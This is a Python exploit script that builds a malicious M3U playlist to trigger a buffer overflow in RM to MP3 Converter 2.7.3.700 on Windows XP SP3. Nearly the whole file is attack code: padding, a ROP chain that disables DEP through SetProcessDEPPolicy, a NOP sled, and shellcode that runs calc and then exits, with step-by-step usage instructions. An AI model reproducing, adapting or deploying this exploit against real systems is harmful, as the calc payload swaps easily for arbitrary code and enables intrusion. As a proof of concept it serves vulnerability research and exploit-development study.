#!/usr/bin/env python3

# Exploit file to pop calc.exe for RM to MP3 Converter v2.7.3.700 on Windows XP.
# How 2 use:
#   Generate the exploit.m3u file by running this script
# 	Wait for the application to load completely
#   Load the exploit.m3u file into the RM to MP3 Converter
#
# Note: uses SetProcessDEPPolicy to defeat DEP.
# Tested on Windows XP SP3.

filename = "exploit.m3u"

print("Creating '" + filename + "' exploit file...")

# Uses hardcoded `kernel32.WinExec("calc")` and hardcoded `msvcrt.exit()`
# We cannot use `kernel32.ExitProcess()` because it has a `0x0A` byte.
exploit = "A"*35021		            # Padding

# Save `esp` into `edi` for shellcode address pointer
exploit += "\x77\x92\xD7\x5A"		# push esp
									# mov eax, edx
									# pop edi
exploit += "AAAA"					# Padding

# Move `edi` into `eax`									
exploit += "\x15\x6D\x8A\x5B"		# push edi
									# pop eax
									# ret
# Save `eax` into `esi`
exploit += "\x7F\x17\x5D\x77"		# push eax
									# pop esi
									# ret

# Add `eax` to point to shellcode (+ 0xC8)
exploit += "\x4D\x12\x55\x77"		# add eax, 0x64
									# ret
exploit += "\x4D\x12\x55\x77"		# add eax, 0x64
									# ret

# Jump over SetProcessDEPPolicy stack to set up
exploit += "\x63\x82\x02\x10"		# add esp, 0x0C
									# ret

# SetProcessDEPPolicy stack
exploit += "\xF4\x28\x86\x7C"		# SetProcessDEPPolicy (0x7C90DC9E)
exploit += "BBBB"					# Return Shellcode address
exploit += "CCCC"					# 0 (disable DEP)

# SetProcessDEPPolicy return address
exploit += "\x49\xD3\xBA\x7C"		# mov [esi + 0x18], eax
									# pop esi
									# ret
exploit += "AAAA"					# Padding for `esi`

# Restore `esi`
exploit += "\x15\x6D\x8A\x5B"		# push edi
									# pop eax
									# ret
exploit += "\x7F\x17\x5D\x77"		# push eax
									# pop esi
									# ret
# SetProcessDEPPolicy parameter 1
# Set `eax` to 0x300
exploit += "\xB4\x57\xA0\x7C"		# xor eax, eax
									# ret
exploit += "\x65\xDE\xBA\x7C"		# mov [esi + 0x1C], eax
									# pop esi
									# ret
exploit += "AAAA"					# Padding for `esi`

# Move `esp` back to SetProcessDEPPolicy stack
# Move `edi` into `eax`, add 0x14 to `eax`, swap `esp` with `eax`
exploit += "\x15\x6D\x8A\x5B"		# push edi
									# pop eax
									# ret
exploit += "\x20\xDE\x18\x3E"		# add eax, 0x14
									# adc edx, 0
									# pop ebp
									# ret 4
exploit += "AAAA"					# Padding for `ebp`
exploit += "\xFF\xA6\xAE\x01"		# xchg esp, eax
									# ret
exploit += "AAAA"					# Padding for `ret 4`

exploit += "\x90"*150				# Use `nop` sled to catch return to shellcode

# Shellcode for `kernel32.WinExec("calc")`
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\x68\x63\x61\x6C\x63"   # push 'calc'
exploit += "\x6A\x01"               # push 0x1
exploit += "\x8D\x4C\x24\x04"       # lea ecx, [esp + 0x4]
exploit += "\x51"                   # push ecx
exploit += "\xB8\x5D\x2B\x86\x7C"   # mov eax, 0x7C862B5D (`kernel32.WinExec`)
exploit += "\xFF\xD0"               # call eax

# Shellcode for `msvcrt.exit()`
# because the exception will keep triggering.
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\xB8\x84\x9E\xC3\x77"   # mov eax, 0x77C39E4 (`msvcrt.exit`)
exploit += "\xFF\xD0"               # call eax

# Write the file
with open(filename, "wb") as f:
    # Encoding iso8859-1 to preserve extended ASCII range!
    f.write(exploit.encode('iso8859-1'))

print("Exploit file '" + filename + "' created!")